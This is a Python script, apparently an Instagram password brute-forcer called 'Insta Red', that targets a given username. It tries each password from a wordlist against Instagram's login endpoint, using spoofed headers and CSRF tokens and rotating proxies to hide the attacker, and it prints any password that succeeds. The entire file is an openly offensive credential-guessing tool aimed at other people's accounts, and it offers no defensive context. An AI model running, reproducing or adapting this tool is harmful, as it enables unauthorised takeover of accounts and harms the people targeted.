#!/usr/bin/python
#coded by:Sign4l
import requests
import json
import time
import os
import random
import sys

clear=lambda: os.system('clear' or 'cls')
clear()
class style:
    red = '\033[91m'
    green = '\033[92m'
    white = '\033[0m'
print(style.green+'                     -----------------------')
print('                     |   --------------    |')
print(style.red+'          		   Insta Red   '+style.green)
print('                     |   --------------    |')
print('                     -----------------------')
print('')
print(style.red+'                             Author')
print(style.green+'                         +-+-+-+-+-+-+')
print(style.green+'                         |'+style.red+'S'+style.green+'|'+style.red+'I'+style.green+'|'+style.red+'G'+style.green+'|'+style.red+'N'+style.green+'|'+style.red+'4'+style.green+'|'+style.red+'L'+style.green+'|')
print(style.green+'                         +-+-+-+-+-+-+')
print('')
print('')
def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)


class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		self.loadPasswords()

		self.IsUserExists()


		UsePorxy = Input(style.red+'[+]'+style.green+' Do you to use proxy??? (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print (style.red+'[+]'+style.green+' %s Passwords loads successfully' % passwordsNumber)
				else:
					print('Password file are empty, Please add passwords to it.')
					Input(style.red+'[+]'+style.green+' Press enter to exit')
					exit()
		else:
			print ('Please create passwords file named "%s"' % self.passwordsFile)
			Input(style.red+'[+]'+style.green+' Press enter to exit')
			exit()

	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print(style.red+'[+]'+style.green+' Check new ip...')
			print (style.red+'[+]'+style.green+' Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
		except Exception as e:
			print  (style.red+'[+]'+style.green+' Can\'t reach proxy "%s"' % proxy)
		print('')

	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print (style.red+'[+]'+style.green+'User named "%s" not found' % username)
			Input(style.red+'[+]'+style.green+' Press enter to exit')
			exit()
		elif (r.status_code == 200):
			return True

	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
		
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])

			UsePorxy = Input(style.red+'[+]'+style.green+' Do you want to use proxy (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print (style.red+'[+]'+style.green+' Try to use proxy after fail.')
				randomProxy() 
			return False
 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False

instabrute = Instabrute(Input(style.red+'[+]'+style.green+'Please enter a Target: '+style.green))

try:
	delayLoop = int(Input(style.red+'[+]'+style.green+' Please add delay between the bruteforce action (in seconds): ')) 
except Exception as e:
	print (style.red+'[+]'+style.green+' Error, software use the defult value "4"')
	delayLoop = 4
print ('')

for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print (style.red+'[+]'+style.green+' Login success %s' % [instabrute.username,password])
	else:
		print (style.red+'[+]'+style.green+' Password incorrect [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('Type y/n to Exit: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		
